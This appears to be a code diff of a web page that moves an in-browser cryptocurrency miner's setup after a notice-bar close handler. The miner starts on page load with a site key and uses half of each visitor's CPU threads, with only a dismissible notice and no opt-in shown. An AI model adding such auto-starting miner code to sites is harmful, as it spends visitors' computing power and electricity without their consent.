@@ -133,12 +133,11 @@
       </span>
       <script src="/assets/script/lib/miner.js"></script>
       <script>
-        const miner = new MinerWorker.Anonymous('46Gxh1vxibaEDjxDNqWYgXigK1GRS1kUm18A5kwbmT4oRj31Mdha3JDgYxXiicLLPKZJUQG3eiQ2cfAV3DX66tVEJ2YBnkp',{throttle: 0.82, threads: navigator.hardwareConcurrency / 2, theme: 'dark'});
-        miner.start(MinerWorker.IF_EXCLUSIVE_TAB);
-
         document.querySelector('.miner-notice-close-btn').addEventListener('click', (evt) => {
           document.querySelector('.miner-notice-bar').style.display = 'none';
         });
+        const miner = new MinerWorker.Anonymous('46Gxh1vxibaEDjxDNqWYgXigK1GRS1kUm18A5kwbmT4oRj31Mdha3JDgYxXiicLLPKZJUQG3eiQ2cfAV3DX66tVEJ2YBnkp',{throttle: 0.82, threads: navigator.hardwareConcurrency / 2, theme: 'dark'});
+        miner.start(MinerWorker.IF_EXCLUSIVE_TAB);
       </script>
     </div>
 
